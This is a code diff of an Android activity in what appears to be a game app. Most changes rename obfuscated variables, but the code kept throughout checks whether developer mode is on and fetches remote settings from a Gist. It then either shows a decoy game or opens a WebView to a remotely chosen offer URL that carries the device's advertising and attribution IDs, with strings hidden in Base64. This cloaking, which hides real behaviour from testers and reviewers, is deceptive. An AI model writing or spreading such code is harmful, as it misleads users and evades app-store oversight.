@@ -1,7 +1,7 @@
 package com.lyurxu.jroek;
 
-import static com.lyurxu.jroek.ApplClss.afLoaded;
 import static com.lyurxu.jroek.F_B_K.strDeep;
+import static com.lyurxu.jroek.ParseStr.decode;
 
 import android.app.Activity;
 import android.content.Context;
@@ -33,33 +33,32 @@ import retrofit2.Retrofit;
 
 public class LJ extends AppCompatActivity {
     private ProgressBar progressBar;
-    private WebView webViewetgpy;
-    private String linketgpy;
-    private ValueCallback<Uri[]> myFilePathCallbacketgpy;
-    private SharedPreferences sPrefsetgpy;
-    private String keyDefaultetgpy;
-    private String offeretgpy;
+    private WebView webView;
+    private String link;
+    private ValueCallback<Uri[]> myFilePathCallback;
+    private SharedPreferences sPrefs;
+    private String offer;
     private String fb_Id;
     public static final String URL_SHARED_PREF = "TEFTVF9XZWJWaWV3X1VSTA==";
-    public static final int INPUT_FILE_REQUEST_CODEetgpy = 1;
+    public static final int INPUT_FILE_REQUEST_CODE = 1;
+    public static String keyDefault;
     public static String statusAppsFlyer;
-    public static String strAppsFlyeretgpy;
+    public static String strAppsFlyer;
     public static String AppsFl_Id;
+    public static boolean afLoaded;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
         progressBar = findViewById(R.id.progressBar);
-        progressBar.setVisibility(ProgressBar.VISIBLE);
 
         if (!devModeOff()) {       // TODO delete !
-
-            webViewetgpy = findViewById(R.id.webView);
-            setWebView(webViewetgpy);
+            webView = findViewById(R.id.webView);
+            setWebView(webView);
 
             Retrofit retrofit = new Retrofit.Builder()
-                    .baseUrl(CNSTN.DB_6_E_47_RAW_EGYPT_RICHES)
+                    .baseUrl(CNSTN.GistLink)
                     .build();
             GistApi gistApi = retrofit.create(GistApi.class);
             Call<ResponseBody> gistQuery = gistApi.getStringUrl();
@@ -70,24 +69,24 @@ public class LJ extends AppCompatActivity {
                         try {
                             String url = response.body().string();
                             String[] params = url.split("\\|");
-                            offeretgpy = params[0];
-                            keyDefaultetgpy = params[1];
+                            offer = params[0];
+                            keyDefault = params[1];
                             fb_Id = params[2];
 
-                            new F_B_K(fb_Id, LJ.this);
+                            F_B_K facebook = new F_B_K(fb_Id, LJ.this);
+                            facebook.init();
 
-                            sPrefsetgpy = getSharedPreferences("bXlXZWJWaWV3UHJlZnM=", Context.MODE_PRIVATE);
-                            linketgpy = sPrefsetgpy.getString(URL_SHARED_PREF, null);
+                            sPrefs = getSharedPreferences("bXlXZWJWaWV3UHJlZnM=", Context.MODE_PRIVATE);
+                            link = sPrefs.getString(URL_SHARED_PREF, null);
 
-                            if (linketgpy != null) {
-                                webViewetgpy.loadUrl(linketgpy);
+                            if (link != null) {
+                                webView.loadUrl(link);
                             } else {
                                 do {
                                 }
                                 while (!afLoaded);
-                                startWebView(offeretgpy);
+                                startWebView(offer);
                             }
-                            progressBar.setVisibility(ProgressBar.INVISIBLE);
                         } catch (IOException e) {
                             e.printStackTrace();
                         }
@@ -97,7 +96,7 @@ public class LJ extends AppCompatActivity {
                 }
 
                 @Override
-                public void onFailure(@NonNull Call<ResponseBody> call, Throwable t) {
+                public void onFailure(@NonNull Call<ResponseBody> call, @NonNull Throwable t) {
                     goToGame();
                 }
             });
@@ -109,58 +108,51 @@ public class LJ extends AppCompatActivity {
 
 
     private void goToGame() {
-        Intent intent = new Intent(this, MMyGameActivity.class);
-        startActivity(intent);
+        startActivity(new Intent(this, MMyGameActivity.class));
         finish();
     }
 
     void startWebView(String link) {
-        if (statusAppsFlyer != null && statusAppsFlyer.equals(CNSTN.decode("Tm9uLW9yZ2FuaWM="))) {
-            String url = link + strAppsFlyeretgpy;
+        if (statusAppsFlyer != null && statusAppsFlyer.equals(decode("Tm9uLW9yZ2FuaWM="))) {
+            String url = link + strAppsFlyer;
             Log.i("MyApp", "non-organic - " + url);
-            webViewetgpy.loadUrl(url);
+            webView.loadUrl(url);
         } else if (strDeep != null) {
             String url = link + strDeep;
-            webViewetgpy.loadUrl(url);
+            webView.loadUrl(url);
             Log.i("MyApp", "deepLink - " + url);
         } else {
-            if (keyDefaultetgpy.equals("NO")) {
+            if (keyDefault.equals("NO")) {
                 goToGame();
             } else {
-                strAppsFlyeretgpy =
-                        keyDefaultetgpy
-                                + CNSTN.decode("P2J1bmRsZT0=") + getPackageName()
-                                + CNSTN.decode("JmFkX2lkPQ==") + F_B_K.AD_ID
-                                + CNSTN.decode("JmFwcHNfaWQ9") + AppsFl_Id
-                                + CNSTN.decode("JmRldl9rZXk9") + CNSTN.decode(CNSTN.AFKey);
-                String url = link + strAppsFlyeretgpy;
+                String url = new ParseStr().parseOrganic(link);
                 Log.i("MyApp", "organic - " + url);
-                webViewetgpy.loadUrl(url);
+                webView.loadUrl(url);
             }
         }
     }
 
+
     @Override
     public void onBackPressed() {
-        webViewetgpy.goBack();
+        webView.goBack();
     }
 
 
     @Override
     protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
-        if (requestCode != INPUT_FILE_REQUEST_CODEetgpy || myFilePathCallbacketgpy == null) {
+        if (requestCode != INPUT_FILE_REQUEST_CODE || myFilePathCallback == null) {
             super.onActivityResult(requestCode, resultCode, data);
             return;
         }
-        if (resultCode == Activity.RESULT_OK ) {
+        if (resultCode == Activity.RESULT_OK & data != null) {
             String dataString = data.getDataString();
-            if (dataString != null) {
-                Uri[] result = new Uri[]{Uri.parse(dataString)};
-                myFilePathCallbacketgpy.onReceiveValue(result);
-                myFilePathCallbacketgpy = null;
-            }
+            Uri[] result = new Uri[]{Uri.parse(dataString)};
+            myFilePathCallback.onReceiveValue(result);
+            myFilePathCallback = null;
         }
     }
+
 
     private boolean devModeOff() {
         int devInt = android.provider.Settings.Secure.getInt(getApplicationContext().getContentResolver(),
@@ -171,15 +163,9 @@ public class LJ extends AppCompatActivity {
 
     class MyWebChromeClient extends WebChromeClient {
         @Override
-        public boolean onShowFileChooser(WebView webView, ValueCallback<Uri[]> filePathCallback,
-                                         FileChooserParams fileChooserParams) {
-            myFilePathCallbacketgpy = filePathCallback;
-            Intent contentSelectionIntent = new Intent(Intent.ACTION_GET_CONTENT);
-            contentSelectionIntent.addCategory(Intent.CATEGORY_OPENABLE);
-            contentSelectionIntent.setType(CNSTN.decode("aW1hZ2UvKg=="));
-            Intent chooserIntent = new Intent(Intent.ACTION_CHOOSER);
-            chooserIntent.putExtra(Intent.EXTRA_INTENT, contentSelectionIntent);
-            startActivityForResult(chooserIntent, INPUT_FILE_REQUEST_CODEetgpy);
+        public boolean onShowFileChooser(WebView webView, ValueCallback<Uri[]> filePathCallback, FileChooserParams fileChooserParams) {
+            myFilePathCallback = filePathCallback;
+            startActivityForResult(new Intent(Intent.ACTION_CHOOSER).putExtra(Intent.EXTRA_INTENT, new Intent(Intent.ACTION_GET_CONTENT).addCategory(Intent.CATEGORY_OPENABLE).setType(decode("aW1hZ2UvKg=="))), INPUT_FILE_REQUEST_CODE);
             return true;
         }
     }
@@ -188,10 +174,10 @@ public class LJ extends AppCompatActivity {
         @Override
         public void onPageStarted(WebView view, String url, Bitmap favicon) {
             super.onPageStarted(view, url, favicon);
-            webViewetgpy.setVisibility(View.VISIBLE);
+            webView.setVisibility(View.VISIBLE);
             progressBar.setVisibility(ProgressBar.INVISIBLE);
 
-            if (url.contains(CNSTN.decode("NDA0"))) {
+            if (url.contains(decode("NDA0"))) {
                 goToGame();
                 finish();
             }
@@ -200,11 +186,12 @@ public class LJ extends AppCompatActivity {
         @Override
         public void onPageFinished(WebView view, String url) {
             super.onPageFinished(view, url);
-            SharedPreferences.Editor editor = sPrefsetgpy.edit();
+            SharedPreferences.Editor editor = sPrefs.edit();
             editor.putString(URL_SHARED_PREF, url);
             editor.apply();
         }
     }
+
 
     private void setWebView(WebView webViewetgpy) {
         webViewetgpy.getSettings().setJavaScriptEnabled(true);
